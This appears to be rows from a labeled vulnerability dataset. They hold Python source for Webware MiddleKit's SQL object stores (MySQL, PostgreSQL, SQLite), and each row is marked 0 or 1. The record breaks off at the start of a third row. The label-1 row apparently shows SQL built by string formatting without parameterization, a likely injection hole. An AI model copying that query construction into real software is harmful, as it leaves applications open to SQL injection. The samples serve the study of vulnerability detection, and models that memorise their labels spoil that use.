            assert obj.serialNum() < 1, 'obj=%s' % rep

        # try to get the next ID (if database supports this)
        idNum = self.retrieveNextInsertId(obj.klass())

        # SQL insert
        sql = obj.sqlInsertStmt(unknownSerialNums, idNum)
        conn, cur = self.executeSQL(sql)
        try:
            # Get new id/serial num
            if idNum is None:
                idNum = self.retrieveLastInsertId(conn, cur)

            # Update object
            obj.setSerialNum(idNum)
            obj.setKey(ObjectKey().initFromObject(obj))
            obj.setChanged(False)

            # Update our object pool
            self._objects[obj.key()] = obj
        finally:
            self.doneWithConnection(conn)

    def retrieveNextInsertId(self, klass):
        """"""Return the id for the next new object of this class.

        Databases which cannot determine the id until the object has been
        added return None, signifying that retrieveLastInsertId
        should be called to get the id after the insert has been made.
        """"""
        return None

    def retrieveLastInsertId(self, conn, cur):
        """"""Return the id of the last INSERT operation by this connection.

        This id is typically a 32-bit int. Used by commitInserts() to get
        the correct serial number for the last inserted object.
        """"""
        return cur.lastrowid

    def commitUpdates(self, allThreads=False):
        conn = None
        try:
            for obj in self._changedObjects.values(allThreads):
                sql = obj.sqlUpdateStmt()
                conn, cur = self.executeSQL(sql, conn)
                obj.setChanged(False)
        finally:
            self.doneWithConnection(conn)
        self._changedObjects.clear(allThreads)

    def commitDeletions(self, allThreads=False):
        conn = None
        try:
            for obj in self._deletedObjects.items(allThreads):
                sql = obj.sqlDeleteStmt()
                conn, cur = self.executeSQL(sql, conn)
                conn.commit()
        finally:
            self.doneWithConnection(conn)
        self._deletedObjects.clear(allThreads)


    ## Fetching ##

    def fetchObject(self, aClass, serialNum, default=NoDefault):
        """"""Fetch a single object of a specific class and serial number.

        aClass can be a Klass object (from the MiddleKit object model),
        the name of the class (e.g., a string) or a Python class.
        Raises an exception if aClass parameter is invalid, or the object
        cannot be located.
        """"""
        klass = self._klassForClass(aClass)
        objects = self.fetchObjectsOfClass(klass, serialNum=serialNum, isDeep=False)
        count = len(objects)
        if count == 0:
            if default is NoDefault:
                raise UnknownObjectError('aClass = %r, serialNum = %r'
                    % (aClass, serialNum))
            else:
                return default
        else:
            assert count == 1
            return objects[0]

    def fetchObjectsOfClass(self, aClass,
            clauses='', isDeep=True, refreshAttrs=True, serialNum=None, clausesArgs=None):
        """"""Fetch a list of objects of a specific class.

        The list may be empty if no objects are found.

        aClass can be a Klass object (from the MiddleKit object model),
        the name of the class (e.g., a string) or a Python class.

        The clauses argument can be any SQL clauses such as 'where x<5 order by x'.
        Obviously, these could be specific to your SQL database, thereby making
        your code non-portable. Use your best judgement.

        serialNum can be a specific serial number if you are looking for
        a specific object. If serialNum is provided, it overrides the clauses.

        You should label all arguments other than aClass:
            objs = store.fetchObjectsOfClass('Foo', clauses='where x<5')
        The reason for labeling is that this method is likely to undergo
        improvements in the future which could include additional arguments.
        No guarantees are made about the order of the arguments except that
        aClass will always be the first.
        Raises an exception if aClass parameter is invalid.
        """"""
        klass = self._klassForClass(aClass)

        # Fetch objects of subclasses first, because the code below
        # will be  modifying clauses and serialNum
        deepObjs = []
        if isDeep:
            for subklass in klass.subklasses():
                deepObjs.extend(self.fetchObjectsOfClass(
                    subklass, clauses, isDeep, refreshAttrs, serialNum, clausesArgs))

        # Now get objects of this exact class
        objs = []
        if not klass.isAbstract():
            fetchSQLStart = klass.fetchSQLStart()
            className = klass.name()
            if serialNum is not None:
                serialNum = int(serialNum)  # make sure it's a valid int
                clauses = 'where %s=%d' % (klass.sqlSerialColumnName(), serialNum)
            if self._markDeletes:
                clauses = self.addDeletedToClauses(clauses)
            conn, cur = self.executeSQL(fetchSQLStart + clauses + ';', commit=False, clausesArgs=clausesArgs)
            try:
                for row in cur.fetchall():
                    serialNum = row[0]
                    key = ObjectKey().initFromClassNameAndSerialNum(className, serialNum)
                    obj = self._objects.get(key)
                    if obj is None:
                        pyClass = klass.pyClass()
                        obj = pyClass()
                        assert isinstance(obj, MiddleObject), (
                            'Not a MiddleObject. obj = %r, type = %r, MiddleObject = %r'
                                % (obj, type(obj), MiddleObject))
                        obj.readStoreData(self, row)
                        obj.setKey(key)
                        self._objects[key] = obj
                    else:
                        # Existing object
                        if refreshAttrs:
                            obj.readStoreData(self, row)
                    objs.append(obj)
            finally:
                self.doneWithConnection(conn)
        objs.extend(deepObjs)
        return objs

    def refreshObject(self, obj):
        assert obj.store() is self
        return self.fetchObject(obj.klass(), obj.serialNum())


    ## Klasses ##

    def klassForId(self, id):
        return self._klassesById[id]


    ## Self utility for SQL, connections, cursors, etc. ##

    def executeSQL(self, sql, connection=None, commit=False, clausesArgs=None):
        """"""Execute the given SQL.

        This will connect to the database for the first time if necessary.
        This method will also log the SQL to self._sqlEcho, if it is not None.
        Returns the connection and cursor used and relies on connectionAndCursor()
        to obtain these. Note that you can pass in a connection to force a
        particular one to be used and a flag to commit immediately.
        """"""
        sql = str(sql)  # Excel-based models yield Unicode strings which some db modules don't like
        sql = sql.strip()
        if aggressiveGC:
            import gc
            assert gc.isenabled()
            gc.collect()
        self._sqlCount += 1
        if self._sqlEcho:
            timestamp = funcs.timestamp()['pretty']
            self._sqlEcho.write('SQL %04i. %s %s\n' % (self._sqlCount, timestamp, sql))
            self._sqlEcho.flush()
        conn, cur = self.connectionAndCursor(connection)
        self._executeSQL(cur, sql, clausesArgs)
        if commit:
            conn.commit()
        return conn, cur

    def _executeSQL(self, cur, sql, clausesArgs=None):
        """"""Invoke execute on the cursor with the given SQL.

        This is a hook for subclasses that wish to influence this event.
        Invoked by executeSQL().
        """"""
        cur.execute(sql, clausesArgs)

    def executeSQLTransaction(self, transaction, connection=None, commit=True):
        """"""Execute the given sequence of SQL statements and commit as transaction.""""""
        if isinstance(transaction, basestring):
            transaction = [transaction]
        try:
            for sql in transaction:
                if connection:
                    self.executeSQL(sql, connection)
                else:
                    connection, cur = self.executeSQL(sql)
        except Exception:
            if connection and commit:
                connection.rollback()
            raise
        if transaction and connection and commit:
            try:
                connection.commit()
            except Exception:
                connection.rollback()
                raise
        return connection

    def executeSQLScript(self, sql, connection=None):
        """"""Execute the given SQL script.

        This uses the nonstandard executescript() method as provided
        by the PySQLite adapter.
        """"""
        sql = str(sql).strip()
        if not connection:
            connection = self.newConnection()
        if not hasattr(connection, 'executescript'):
            raise AttributeError(
                'Script execution not supported by database adapter.')
        return connection.executescript(sql)

    def setSQLEcho(self, file):
        """"""Set a file to echo sql statements to, as sent through executeSQL().

        None can be passed to turn echo off.
        """"""
        self._sqlEcho = file

    def connectionAndCursor(self, connection=None):
        """"""Return the connection and cursor needed for executing SQL.

        Takes into account factors such as setting('Threaded') and the
        threadsafety level of the DB API module. You can pass in a connection to
        force a particular one to be used. Uses newConnection() and connect().
        """"""
        if aggressiveGC:
            import gc
            assert gc.isenabled()
            gc.collect()
        if connection:
            conn = connection
        elif self._threaded:
            if self._pool:
                conn = self._pool.connection()
            elif self._threadSafety == 1:
                conn = self.newConnection()
            else:  # safety = 2, 3
                if not self._connected:
                    self.connect()
                conn = self._connection
        else:
            # Non-threaded
            if not self._connected:
                self.connect()
            conn = self._connection
        cursor = conn.cursor()
        return conn, cursor

    def threadSafety(self):
        """"""Return the threadsafety of the DB API module.""""""
        return self.dbapiModule().threadsafety

    def dbapiVersion(self):
        """"""Return the version of the DB API module.""""""
        module = self.dbapiModule()
        return '%s %s' % (module.__name__, module.version)

    def dbVersion(self):
        """"""Return the database version.

        Subclass responsibility.
        """"""
        raise AbstractError(self.__class__)

    def addDeletedToClauses(self, clauses):
        """"""Modify the given set of clauses so that it filters out records with non-NULL deleted field.""""""
        clauses = clauses.strip()
        if clauses.lower().startswith('where'):
            where = clauses[5:]
            orderByIndex = where.lower().find('order by')
            if orderByIndex < 0:
                orderBy = ''
            else:
                where, orderBy = where[:orderByIndex], where[orderByIndex:]
            return 'where deleted is null and (%s) %s' % (where, orderBy)
        else:
            return 'where deleted is null %s' % clauses


    ## Obj refs ##

    def fetchObjRef(self, objRef):
        """"""Fetch referenced object.

        Given an unarchived object reference, this method returns the actual
        object for it (or None if the reference is NULL or dangling). While
        this method assumes that obj refs are stored as 64-bit numbers containing
        the class id and object serial number, subclasses are certainly able to
        override that assumption by overriding this method.
        """"""
        assert isinstance(objRef, long), 'type=%r, objRef=%r' % (type(objRef), objRef)
        if objRef == 0:
            return None
        else:
            klassId, serialNum = objRefSplit(objRef)
            if klassId == 0 or serialNum == 0:
                # invalid! we don't use 0 serial numbers
                return self.objRefZeroSerialNum(objRef)

            klass = self.klassForId(klassId)

            # Check if we already have this in memory first
            key = ObjectKey()
            key.initFromClassNameAndSerialNum(klass.name(), serialNum)
            obj = self._objects.get(key)
            if obj:
                return obj

            clauses = 'where %s=%d' % (klass.sqlSerialColumnName(), serialNum)
            objs = self.fetchObjectsOfClass(klass, clauses, isDeep=False)
            if len(objs) == 1:
                return objs[0]
            elif len(objs) > 1:
                # @@ 2000-11-22 ce: expand the msg with more information
                raise ValueError('Multiple objects.')
            else:
                return self.objRefDangles(objRef)

    def objRefInMem(self, objRef):
        """"""Return referenced object in memory.

        Returns the object corresponding to the given objref if and only if it
        has been loaded into memory. If the object has never been fetched from
        the database, None is returned.
        """"""
        assert isinstance(objRef, long), 'type=%r, objRef=%r' % (type(objRef), objRef)
        if objRef == 0:
            return 0
        else:
            klassId, serialNum = objRefSplit(objRef)
            if klassId == 0 or serialNum == 0:
                # invalid! we don't use 0 serial numbers
                return self.objRefZeroSerialNum(objRef)

            klass = self.klassForId(klassId)

            # return whether we have this object in memory
            key = ObjectKey()
            key.initFromClassNameAndSerialNum(klass.name(), serialNum)
            return self._objects.get(key)

    def objRefZeroSerialNum(self, objRef):
        """"""Raise serial number zero error.

        Invoked by fetchObjRef() if either the class or the object serial
        number is zero.
        """"""
        raise ObjRefZeroSerialNumError(objRefSplit(objRef))

    def objRefDangles(self, objRef):
        """"""Raise dangling reference error.

        Invoked by fetchObjRef() if there is no possible target object
        for the given objRef.

        E.g., this can happen for a dangling reference. This method invokes
        self.warning() and includes the objRef as decimal, hexadecimal
        and class:obj numbers.
        """"""
        raise ObjRefDanglesError(objRefSplit(objRef))


    ## Special Cases ##

    def filterDateTimeDelta(self, dtd):
        """"""Adapt DateTimeDeltas.

        Some databases have no TIME type and therefore will not return
        DateTimeDeltas. This utility method is overridden by subclasses
        as appropriate and invoked by the test suite.
        """"""
        return dtd

    def sqlNowCall(self):
        """"""Get current DateTime.""""""
        return 'CURRENT_TIMESTAMP'


    ## Self util ##

    def doneWithConnection(self, conn):
        """"""Invoked by self when a connection is no longer needed.

        The default behavior is to commit and close the connection.
        """"""
        if conn is not None:
            # Starting with 1.2.0, MySQLdb disables autocommit by default,
            # as required by the DB-API standard (PEP-249). If you are using
            # InnoDB tables or some other type of transactional table type,
            # you'll need to do connection.commit() before closing the connection,
            # or else none of your changes will be written to the database.
            try:
                conn.commit()
            except Exception:
                pass
            conn.close()


    ## Debugging ##

    def dumpTables(self, out=None):
        if out is None:
            out = sys.stdout
        out.write('DUMPING TABLES\n')
        out.write('BEGIN\n')
        conn = None
        try:
            for klass in self.model().klasses().values():
                out.write(klass.name() + '\n')
                conn, cur = self.executeSQL('select * from %s;'
                    % klass.name(), conn)
                out.write(str(self._cursor.fetchall()))
                out.write('\n')
        finally:
            self.doneWithConnection(conn)
        out.write('END\n')

    def dumpKlassIds(self, out=None):
        if out is None:
            out = sys.stdout
        wr = out.write('DUMPING KLASS IDs\n')
        for klass in self.model().klasses().values():
            out.write('%25s %2i\n' % (klass.name(), klass.id()))
        out.write('\n')

    def dumpObjectStore(self, out=None, progress=False):
        if out is None:
            out = sys.stdout
        for klass in self.model().klasses().values():
            if progress:
                sys.stderr.write(""."")
            out.write('%s objects\n' % (klass.name()))
            attrs = [attr for attr in klass.allAttrs() if attr.hasSQLColumn()]
            colNames = [attr.name() for attr in attrs]
            colNames.insert(0, klass.sqlSerialColumnName())
            out.write(CSVJoiner.joinCSVFields(colNames) + ""\n"")

            # write out a line for each object in this class
            objlist = self.fetchObjectsOfClass(klass.name(), isDeep=False)
            for obj in objlist:
                fields = []
                fields.append(str(obj.serialNum()))
                for attr in attrs:
                    # jdh 2003-03-07: if the attribute is a dangling object reference, the value
                    # will be None.  This means that dangling references will _not_ be remembered
                    # across dump/generate/create/insert procedures.
                    method = getattr(obj, attr.pyGetName())
                    value = method()
                    if value is None:
                        fields.append('')
                    elif isinstance(value, MiddleObject):
                        fields.append('%s.%d' % (value.klass().name(),
                            value.serialNum()))
                    else:
                        fields.append(str(value))
                out.write(CSVJoiner.joinCSVFields(fields).replace('\r', '\\r'))

                out.write('\n')
            out.write('\n')
        out.write('\n')
        if progress:
            sys.stderr.write(""\n"")


class Model(object):

    def sqlDatabaseName(self):
        """"""Return the name of the database.

        This is either the 'Database' setting or self.name().
        """"""
        name = self.setting('Database', None)
        if name is None:
            name = self.name()
        return name


class MiddleObjectMixIn(object):

    def sqlObjRef(self):
        """"""Return the 64-bit integer value that refers to self in a SQL database.

        This only makes sense if the UseBigIntObjRefColumns setting is True.
        """"""
        return objRefJoin(self.klass().id(), self.serialNum())

    def sqlInsertStmt(self, unknowns, id=None):
        """"""Return SQL insert statements.

        Returns the SQL insert statements for MySQL (as a tuple) in the form:
            insert into table (name, ...) values (value, ...);

        May add an info object to the unknowns list for obj references that
        are not yet resolved.
        """"""
        klass = self.klass()
        insertSQLStart, sqlAttrs = klass.insertSQLStart(includeSerialColumn=id)
        values = []
        append = values.append
        extend = values.extend
        if id is not None:
            append(str(id))
        for attr in sqlAttrs:
            try:
                value = attr.sqlValue(self.valueForAttr(attr))
            except UnknownSerialNumberError as exc:
                exc.info.sourceObject = self
                unknowns.append(exc.info)
                if self.store().model().setting('UseBigIntObjRefColumns', False):
                    value = 'NULL'
                else:
                    value = ('NULL', 'NULL')
            if isinstance(value, basestring):
                append(value)
            else:
                # value could be sequence for attrs requiring multiple SQL columns
                extend(value)
        if not values:
            values = ['0']
        values = ','.join(values)
        return insertSQLStart + values + ');'

    def sqlUpdateStmt(self):
        """"""Return SQL update statement.

        Returns the SQL update statement of the form:
            update table set name=value, ... where idName=idValue;
        Installed as a method of MiddleObject.
        """"""
        assert self._mk_changedAttrs
        klass = self.klass()
        res = []
        for attr in self._mk_changedAttrs.values():
            res.append(attr.sqlUpdateExpr(self.valueForAttr(attr)))
        res = ','.join(res)
        res = ('update ', klass.sqlTableName(), ' set ', res, ' where ',
            klass.sqlSerialColumnName(), '=', str(self.serialNum()))
        return ''.join(res)

    def sqlDeleteStmt(self):
        """"""Return SQL delete statement.

        Returns the SQL delete statement for MySQL of the form:
            delete from table where idName=idValue;
        Or if deletion is being marked with a timestamp:
            update table set deleted=Now();
        Installed as a method of MiddleObject.
        """"""
        klass = self.klass()
        assert klass is not None
        if self.store().model().setting('DeleteBehavior', 'delete') == 'mark':
            return 'update %s set deleted=%s where %s=%d;' % (
                klass.sqlTableName(), self.store().sqlNowCall(),
                klass.sqlSerialColumnName(), self.serialNum())
        else:
            return 'delete from %s where %s=%d;' % (klass.sqlTableName(),
                klass.sqlSerialColumnName(), self.serialNum())

    def referencingObjectsAndAttrsFetchKeywordArgs(self, backObjRefAttr):
        if self.store().setting('UseBigIntObjRefColumns'):
            return dict(refreshAttrs=True, clauses='WHERE %s=%s'
                % (backObjRefAttr.sqlColumnName(), self.sqlObjRef()))
        else:
            classIdName, objIdName = backObjRefAttr.sqlColumnNames()
            return dict(refreshAttrs=True, clauses='WHERE (%s=%s AND %s=%s)'
                % (classIdName, self.klass().id(), objIdName, self.serialNum()))

MixIn(MiddleObject, MiddleObjectMixIn)
    # Normally we don't have to invoke MixIn()--it's done automatically.
    # However, that only works when augmenting MiddleKit.Core classes
    # (MiddleObject belongs to MiddleKit.Run).


import MiddleKit.Design.KlassSQLSerialColumnName


class Klass(object):

    _fetchSQLStart = None  # help out the caching mechanism in fetchSQLStart()
    _insertSQLStart = None  # help out the caching mechanism in insertSQLStart()

    def sqlTableName(self):
        """"""Return the name of the SQL table for this class.

        Returns self.name().
        Subclasses may wish to override to provide special quoting that
        prevents name collisions between table names and reserved words.
        """"""
        return self.name()

    def fetchSQLStart(self):
        if self._fetchSQLStart is None:
            attrs = self.allDataAttrs()
            attrs = [attr for attr in attrs if attr.hasSQLColumn()]
            colNames = [self.sqlSerialColumnName()]
            colNames.extend([attr.sqlColumnName() for attr in attrs])
            self._fetchSQLStart = 'select %s from %s ' % (','.join(colNames), self.sqlTableName())
        return self._fetchSQLStart

    def insertSQLStart(self, includeSerialColumn=False):
        """"""Return a tuple of insertSQLStart (a string) and sqlAttrs (a list).""""""
        if self._insertSQLStart is None:
            res = ['insert into %s (' % self.sqlTableName()]
            attrs = self.allDataAttrs()
            attrs = [attr for attr in attrs if attr.hasSQLColumn()]
            fieldNames = [attr.sqlColumnName() for attr in attrs]
            if includeSerialColumn or len(fieldNames) == 0:
                fieldNames.insert(0, self.sqlSerialColumnName())
            res.append(','.join(fieldNames))
            res.append(') values (')
            self._insertSQLStart = ''.join(res)
            self._sqlAttrs = attrs
        return self._insertSQLStart, self._sqlAttrs


class Attr(object):

    def shouldRegisterChanges(self):
        """"""Return self.hasSQLColumn().

        This only makes sense since there would be no point in registering
        changes on an attribute with no corresponding SQL column. The standard
        example of such an attribute is ""list"".
        """"""
        return self.hasSQLColumn()

    def hasSQLColumn(self):
        """"""Check if there is a correlating SQL column.

        Returns true if the attribute has a direct correlating SQL column in
        its class' SQL table definition.
        Most attributes do. Those of type list do not.
        """"""
        return not self.get('isDerived', False)

    def sqlColumnName(self):
        """"""Return the SQL column name corresponding to this attribute-

        This is consisting of self.name() + self.sqlTypeSuffix().
        """"""
        if not self._sqlColumnName:
            self._sqlColumnName = self.name()
        return self._sqlColumnName

    def sqlValue(self, value):
        """"""Return SQL for Python value.

        For a given Python value, this returns the correct string for use in a
        SQL statement. Subclasses will typically *not* override this method,
        but instead, sqlForNonNone() and on rare occasions, sqlForNone().
        """"""
        if value is None:
            return self.sqlForNone()
        else:
            return self.sqlForNonNone(value)

    def sqlForNone(self):
        return 'NULL'

    def sqlForNonNone(self, value):
        return repr(value)

    def sqlUpdateExpr(self, value):
        """"""Return update assignments.

        Returns the assignment portion of an UPDATE statement such as:
            ""foo='bar'""
        Using sqlColumnName() and sqlValue(). Subclasses only need to
        override this if they have a special need (such as multiple columns,
        see ObjRefAttr).
        """"""
        colName = self.sqlColumnName()
        return colName + '=' + self.sqlValue(value)

    def readStoreDataRow(self, obj, row, i):
        """"""By default, an attr reads one data value out of the row.""""""
        value = row[i]
        obj.setValueForAttr(self, value)
        return i + 1


class BasicTypeAttr(object):
    pass


class IntAttr(object):

    def sqlForNonNone(self, value):
        return str(value)
        # it's important to use str() since an int might point
        # to a long (whose repr() would be suffixed with an 'L')


class LongAttr(object):

    def sqlForNonNone(self, value):
        return str(value)


class DecimalAttr(object):

    def sqlForNonNone(self, value):
        return str(value)  # repr() will give Decimal(""3.4"")


class BoolAttr(object):

    def sqlForNonNone(self, value):
        return '1' if value else '0'  # MySQL and MS SQL will take 1 and 0 for bools


class ObjRefAttr(object):

    def sqlColumnName(self):
        if not self._sqlColumnName:
            if self.setting('UseBigIntObjRefColumns', False):
                self._sqlColumnName = self.name() + 'Id'  # old way: one 64 bit column
            else:
                # new way: 2 int columns for class id and obj id
                self._sqlColumnName = '%s,%s' % self.sqlColumnNames()
        return self._sqlColumnName

    def sqlColumnNames(self):
        if not self._sqlColumnNames:
            assert not self.setting('UseBigIntObjRefColumns', False)
            name = self.name()
            classIdName, objIdName = self.setting('ObjRefSuffixes')
            classIdName = name + classIdName
            objIdName = name + objIdName
            self._sqlColumnNames = (classIdName, objIdName)
        return self._sqlColumnNames

    def sqlForNone(self):
        if self.setting('UseBigIntObjRefColumns', False):
            return 'NULL'
        else:
            return 'NULL,NULL'

    def sqlForNonNone(self, value):
        assert isinstance(value, MiddleObject)
        if value.serialNum() == 0:
            info = UnknownSerialNumInfo()
            info.sourceAttr = self
            info.targetObject = value
            raise UnknownSerialNumberError(info)
        else:
            if self.setting('UseBigIntObjRefColumns', False):
                return str(value.sqlObjRef())
            else:
                return str(value.klass().id()), str(value.serialNum())

    def sqlUpdateExpr(self, value):
        """"""Return update assignments.

        Returns the assignment portion of an UPDATE statement such as:
            ""foo='bar'""
        Using sqlColumnName() and sqlValue(). Subclasses only need to
        override this if they have a special need (such as multiple columns,
        see ObjRefAttr).
        """"""
        if self.setting('UseBigIntObjRefColumns', False):
            colName = self.sqlColumnName()
            return colName + '=' + self.sqlValue(value)
        else:
            classIdName, objIdName = self.sqlColumnNames()
            if value is None:
                classId = objId = 'NULL'
            else:
                classId = value.klass().id()
                objId = value.serialNum()
            return '%s=%s,%s=%s' % (classIdName, classId, objIdName, objId)

    def readStoreDataRow(self, obj, row, i):
        # This does *not* get called under the old approach of single obj ref columns.
        # See MiddleObject.readStoreData.
        classId, objId = row[i], row[i+1]
        if objId is None:
            value = None
        else:
            value = objRefJoin(classId, objId)
            # @@ 2004-20-02 ce ^ that's wasteful to join them just so they can be split later,
            # but it works well with the legacy code
        obj.setValueForAttr(self, value)
        return i + 2


class ListAttr(object):

    def hasSQLColumn(self):
        return False

    def readStoreDataRow(self, obj, row, i):
        return i


class AnyDateTimeAttr(object):

    def sqlForNonNone(self, value):
        # Chop off the milliseconds -- SQL databases seem to dislike that.
        return ""'%s'"" % str(value).split('.', 1)[0]


class DateAttr(object):

    def sqlForNonNone(self, value):
        # We often get ""YYYY-MM-DD HH:MM:SS"" from datetime, so we split
        # on space and take the first value to work around that.
        # This works fine with Python's date class (does no harm).
        if not isinstance(value, basestring):
            value = str(value).split(None, 1)[0]
        return ""'%s'"" % value
/n/n/nMiddleKit/Run/SQLiteObjectStore.py/n/nimport sqlite3 as sqlite

from SQLObjectStore import SQLObjectStore


class SQLiteObjectStore(SQLObjectStore):
    """"""SQLiteObjectStore implements an object store backed by a SQLite database.

    See the SQLite docs or the DB API 2.0 docs for more information:
      https://docs.python.org/2/library/sqlite3.html
      https://www.python.org/dev/peps/pep-0249/
    """"""

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('database'):
            args['database'] = '%s.db' % self._model.sqlDatabaseName()

    def newConnection(self):
        kwargs = self._dbArgs.copy()
        self.augmentDatabaseArgs(kwargs)
        return self.dbapiModule().connect(**kwargs)

    def dbapiModule(self):
        return sqlite

    def dbVersion(self):
        return ""SQLite %s"" % sqlite.sqlite_version

    def _executeSQL(self, cur, sql, clausesArgs=None):
        try:
            cur.execute(sql, clausesArgs)
        except sqlite.Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise
        except sqlite.OperationalError as e:
            if 'database is locked' in str(e):
                print ('Please consider installing a newer SQLite version'
                    ' or increasing the timeout.')
            raise

    def sqlNowCall(self):
        return ""datetime('now')""


class StringAttr(object):

    def sqlForNonNone(self, value):
        return ""'%s'"" % value.replace(""'"", ""''"")
/n/n/n",0
107,107,23414a49db38c1a34097fe5682223b4e8c3518a9,"/MiddleKit/Run/MySQLObjectStore.py/n/nimport new

import MySQLdb
from MySQLdb import Warning

from SQLObjectStore import SQLObjectStore


class MySQLObjectStore(SQLObjectStore):
    """"""MySQLObjectStore implements an object store backed by a MySQL database.

    MySQL notes:
      * MySQL home page: http://www.mysql.com.
      * MySQL version this was developed and tested with: 3.22.34 & 3.23.27
      * The platforms developed and tested with include Linux (Mandrake 7.1)
        and Windows ME.
      * The MySQL-Python DB API 2.0 module used under the hood is MySQLdb
        by Andy Dustman: http://dustman.net/andy/python/MySQLdb/.
      * Newer versions of MySQLdb have autocommit switched off by default.

    The connection arguments passed to __init__ are:
      - host
      - user
      - passwd
      - port
      - unix_socket
      - client_flag
      - autocommit

    You wouldn't use the 'db' argument, since that is determined by the model.

    See the MySQLdb docs or the DB API 2.0 docs for more information.
      http://www.python.org/topics/database/DatabaseAPI-2.0.html
    """"""

    def __init__(self, **kwargs):
        self._autocommit = kwargs.pop('autocommit', False)
        SQLObjectStore.__init__(self, **kwargs)

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('db'):
            args['db'] = self._model.sqlDatabaseName()

    def newConnection(self):
        kwargs = self._dbArgs.copy()
        self.augmentDatabaseArgs(kwargs)
        conn = self.dbapiModule().connect(**kwargs)
        if self._autocommit:
            # MySQLdb 1.2.0 and later disables autocommit by default
            try:
                conn.autocommit(True)
            except AttributeError:
                pass
        return conn

    def connect(self):
        SQLObjectStore.connect(self)
        if self._autocommit:
            # Since our autocommit patch above does not get applied to pooled
            # connections, we have to monkey-patch the pool connection method
            try:
                pool = self._pool
                connection = pool.connection
            except AttributeError:
                pass
            else:
                def newConnection(self):
                    conn = self._normalConnection()
                    try:
                        conn.autocommit(True)
                    except AttributeError:
                        pass
                    return conn
                pool._normalConnection = connection
                pool._autocommit = self._autocommit
                pool.connection = new.instancemethod(
                    newConnection, pool, pool.__class__)

    def retrieveLastInsertId(self, conn, cur):
        try:
            # MySQLdb module 1.2.0 and later
            lastId = conn.insert_id()
        except AttributeError:
            # MySQLdb module 1.0.0 and earlier
            lastId = cur.insert_id()
        # The above is more efficient than this:
        # conn, cur = self.executeSQL('select last_insert_id();', conn)
        # id = cur.fetchone()[0]
        return lastId

    def dbapiModule(self):
        return MySQLdb

    def _executeSQL(self, cur, sql):
        try:
            cur.execute(sql)
        except MySQLdb.Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise

    def sqlNowCall(self):
        return 'NOW()'


# Mixins

class StringAttr(object):

    def sqlForNonNone(self, value):
        """"""MySQL provides a quoting function for string -- this method uses it.""""""
        return ""'"" + MySQLdb.escape_string(value) + ""'""
/n/n/n/MiddleKit/Run/PostgreSQLObjectStore.py/n/n
connectionPool = True
try:
    import psycopg2 as dbi  # psycopg2 version 2
    from psycopg2 import Warning, DatabaseError
    from psycopg2.extensions import QuotedString
except ImportError:
    try:
        import psycopg as dbi  # psycopg version 1
        from psycopg import Warning, DatabaseError
        from psycopg.extensions import QuotedString
    except ImportError:
        connectionPool = False
        import pgdb as dbi  # PyGreSQL
        from pgdb import Warning, DatabaseError
        def QuotedString(s):
            return ""'%s'"" % s.replace(""\\"", ""\\\\"").replace(""'"", ""''"")

from MiscUtils import NoDefault
from MiscUtils.MixIn import MixIn
from MiddleKit.Run.ObjectKey import ObjectKey
from MiddleObject import MiddleObject

from SQLObjectStore import SQLObjectStore, UnknownSerialNumberError


class PostgreSQLObjectStore(SQLObjectStore):
    """"""PostgresObjectStore implements an object store backed by a PostgreSQL database.

    The connection arguments passed to __init__ are:
      - host
      - user
      - passwd
      - port
      - unix_socket
      - client_flag

    You wouldn't use the 'db' argument, since that is determined by the model.
    """"""

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('database'):
            args['database'] = self._model.sqlDatabaseName()

    def newConnection(self):
        args = self._dbArgs.copy()
        self.augmentDatabaseArgs(args)
        return self.dbapiModule().connect(**args)

    if connectionPool:

        # psycopg doesn't seem to work well with DBPool. Besides, it does
        # its own connection pooling internally, so DBPool is unnecessary.

        def setting(self, name, default=NoDefault):
            if name == 'SQLConnectionPoolSize':
                return 0
            return SQLObjectStore.setting(self, name, default)

        # psycopg doesn't like connections to be closed because of pooling

        def doneWithConnection(self, conn):
            pass

    def newCursorForConnection(self, conn, dictMode=False):
        return conn.cursor()

    def retrieveNextInsertId(self, klass):
        seqname = ""%s_%s_seq"" % (klass.name(), klass.sqlSerialColumnName())
        conn, curs = self.executeSQL(""select nextval('%s')"" % seqname)
        value = curs.fetchone()[0]
        assert value, ""Didn't get next id value from sequence""
        return value

    def dbapiModule(self):
        return dbi

    def _executeSQL(self, cur, sql):
        try:
            cur.execute(sql)
        except Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise

    def saveChanges(self):
        conn, cur = self.connectionAndCursor()
        try:
            SQLObjectStore.saveChanges(self)
        except DatabaseError:
            conn.rollback()
            raise
        except Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                conn.rollback()
                raise
        conn.commit()

    def sqlCaseInsensitiveLike(self, a, b):
        return ""%s ilike %s"" % (a, b)

    def sqlNowCall(self):
        return 'now()'


class StringAttr(object):

    def sqlForNonNone(self, value):
        """"""psycopg provides a quoting function for string -- use it.""""""
        return ""%s"" % QuotedString(value)


class BoolAttr(object):

    def sqlForNonNone(self, value):
        if value:
            return 'TRUE'
        else:
            return 'FALSE'
/n/n/n/MiddleKit/Run/SQLiteObjectStore.py/n/nimport sqlite3 as sqlite

from SQLObjectStore import SQLObjectStore


class SQLiteObjectStore(SQLObjectStore):
    """"""SQLiteObjectStore implements an object store backed by a SQLite database.

    See the SQLite docs or the DB API 2.0 docs for more information:
      https://docs.python.org/2/library/sqlite3.html
      https://www.python.org/dev/peps/pep-0249/
    """"""

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('database'):
            args['database'] = '%s.db' % self._model.sqlDatabaseName()

    def newConnection(self):
        kwargs = self._dbArgs.copy()
        self.augmentDatabaseArgs(kwargs)
        return self.dbapiModule().connect(**kwargs)

    def dbapiModule(self):
        return sqlite

    def dbVersion(self):
        return ""SQLite %s"" % sqlite.sqlite_version

    def _executeSQL(self, cur, sql):
        try:
            cur.execute(sql)
        except sqlite.Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise
        except sqlite.OperationalError as e:
            if 'database is locked' in str(e):
                print ('Please consider installing a newer SQLite version'
                    ' or increasing the timeout.')
            raise

    def sqlNowCall(self):
        return ""datetime('now')""


class StringAttr(object):

    def sqlForNonNone(self, value):
        return ""'%s'"" % value.replace(""'"", ""''"")
/n/n/n",1
114,114,1a5d6ccf02bec303d454f87a6bb39baed30c205f,"vagrant/forum/forumdb.py/n/n# ""Database code"" for the DB Forum.

import psycopg2

DBNAME = ""forum""

def get_posts():
  """"""Return all posts from the 'database', most recent first.""""""
